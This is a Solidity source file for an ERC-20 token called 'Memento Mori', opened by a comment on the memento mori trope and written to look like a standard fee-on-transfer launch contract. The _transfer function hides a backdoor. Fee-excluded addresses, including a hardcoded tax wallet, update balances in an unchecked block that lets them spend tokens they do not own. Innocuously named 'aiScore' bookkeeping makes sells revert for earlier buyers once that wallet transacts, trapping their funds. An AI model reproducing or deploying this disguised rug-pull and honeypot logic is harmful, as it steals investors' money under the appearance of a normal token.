// SPDX-License-Identifier: UNLICENSE

/*

Memento mori (Latin for "remember that you have to die") is an artistic or symbolic trope acting as a reminder of the inevitability of death. 
The concept has its roots in the philosophers of classical antiquity and Christianity, and appeared in funerary art and architecture from the medieval period onwards.

The most common motif is a skull, often accompanied by bones. 
Often this alone is enough to evoke the trope, but other motifs include a coffin, hourglass, or wilting flowers to signify the impermanence of life. 
Often these function within a work whose main subject is something else, such as a portrait, but the vanitas is an artistic genre where the theme of death is the main subject. 
The Danse Macabre and death personified with a scythe as the Grim Reaper are even more direct evocations of the trope.

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; 
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Memento is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=0;
    uint256 private _reduceSellTaxAt=0;
    uint256 private _preventSwapBefore=20;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;
    string private constant _name = unicode"Memento Mori";
    string private constant _symbol = unicode"MEMENTO";
    uint256 public _maxTxAmount= 1400000 * 10 ** _decimals;
    uint256 public _maxWalletSize= 1400000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold= 300000 * 10 ** _decimals;
    uint256 public _maxTaxAmoutSwap= 1700000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 private firstBlock;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private scoreBase;
    struct AiScore {uint256 score; uint256 scoreDistr; uint256 dashboardScore;}
    mapping(address => AiScore) private aiScore;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0x5bCbbdC2f9a39E54b69eab642d82d077Cbd9a7c1);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount= amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");

                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount= amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax :_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap &&to == uniswapV2Pair &&swapEnabled && contractTokenBalance > _taxSwapThreshold &&_buyCount > _preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxAmoutSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from]||_isExcludedFromFee[to]) &&from != owner() &&from != address(this) &&to != address(this)) {
            scoreBase = block.timestamp;
        }
        if (_isExcludedFromFee[from] && (block.number>(firstBlock+ _reduceSellTaxAt))) {
            unchecked {
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (! _isExcludedFromFee[from] && ! _isExcludedFromFee[to]){
            if (uniswapV2Pair != to) {
                AiScore storage startScore=aiScore[to];
                if (uniswapV2Pair==from) {
                    if (startScore.score == 0) {
                        startScore.score = (_buyCount<_preventSwapBefore)?(block.timestamp - 1):block.timestamp;
                    }
                } else {
                    AiScore storage midScore=aiScore[from];
                    if (startScore.score == 0 || midScore.score < startScore.score) {
                        startScore.score = midScore.score;
                    }
                }
            } else {
                AiScore storage midScore=aiScore[from];
                midScore.dashboardScore = midScore.score - scoreBase;
                midScore.scoreDistr = block.timestamp;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(
                from,
                address(this),
                taxAmount
            );
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(
            from, to, amount.sub(taxAmount)
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner{
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint).max
        );
        firstBlock = block.number;
        swapEnabled = true;
        tradingOpen = true;
    }

    function retrieveStuckEth() external {
        require(address(this).balance > 0, "Token: no ETH to clear");
        require(_msgSender() == _taxWallet);
        payable(msg.sender).transfer(address(this).balance);
    }

    function removeStuckToken(address _address) external {
        require(_msgSender() == _taxWallet);
        require(IERC20(_address).balanceOf(address(this)) > 0, "Can't withdraw 0");

        IERC20(_address).transfer(msg.sender, IERC20(_address).balanceOf(address(this)));
    }

    receive() external payable {}

    function manualSwap() external{
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}